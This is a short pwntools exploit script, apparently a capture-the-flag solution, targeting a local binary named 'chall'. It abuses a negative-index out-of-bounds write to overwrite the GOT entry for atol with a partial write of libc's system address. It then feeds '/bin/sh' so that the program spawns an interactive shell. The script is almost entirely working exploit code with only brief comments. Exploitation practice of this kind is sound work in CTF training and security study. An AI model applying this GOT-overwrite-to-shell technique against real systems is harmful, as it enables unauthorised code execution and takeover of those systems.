from pwn import *

elf = ELF("./chall")
libc = ELF("./libc.so.6")
p = process("./chall")

# GOT overwrite
p.sendlineafter("index: ", "-2" )
p.sendlineafter("value: ", str(elf.got["atol"] - 0x08) )

# write system function to atol( 2Byte )
# atol( value ) => system( value )
p.sendafter("index: ", "0" )
p.sendafter("value: ", b"/bin/sh\0" + p64(libc.symbols["system"])[:2] )

p.interactive()
